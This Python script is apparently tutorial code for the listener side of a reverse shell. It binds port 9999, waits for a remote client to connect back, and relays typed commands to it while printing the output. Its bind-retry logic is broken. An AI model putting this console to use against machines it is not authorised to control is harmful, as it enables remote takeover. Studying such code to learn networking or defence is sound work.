#Written by FoxSinOfGreed1729
#Many Thanks to TheNewBoston
import socket
import sys

#Create a socket allowing us to connect to client
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        #Host empty coz we're creating a server, the host will connect back
        port = 9999
        #Some Random port
        s = socket.socket()
        #Created the actual socket
    except socket.error as msg:
        print('Error in socket creation' + str(msg))

#now we'll bind the port info to the socket
def socket_bind():
    flag = 0
    try:
        global host
        global port
        global s
        print('Binding socket to port ' + str(port))
        s.bind((host, port))
        s.listen(10)
        #Number of bad connections it'll accept before stopping
    except socket.error as msg:
        print('Socket binding error ' + str(msg))
        print('Retrying......')
        if flag > 5:
            socket_bind()

#Till now, We only listened for connections but now, we'll actually aceept the connetion
#Establish a connection with client
#Socket needs to be listening to accept connections
def socket_accept():
    conn, addr = s.accept()
    #This will wait untill connection has been Established
    print('Connection Established at IP ' + addr[0] + 'And Port ' + str(addr[1]))
    #Addr is info about the connections
    #Conn is a reference to the connection itself
    send_comand(conn)
    conn.close()

#Function to send commands
def send_comand(conn):
    osname = str(conn.recv(1024), "utf-8")
    print('OS is ' + osname)
    print('Please give commands accordingly')
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
            #A thing to remember is that stuff thats taken as input isn't bytes
            #It's in byte type so we'll have to convert it to string manually
            #Whenever we want to print it out to the user, it needs to be string
            #Whenever we need to send it over the network, it needs to be bytes
        if len(cmd) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(2048), "utf-8")
            #2048 is the buffer size and utf is basic charachter encoding for a string
            print(client_response, end='')
            #the end keyword is to not shift the cursor to a new line

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()
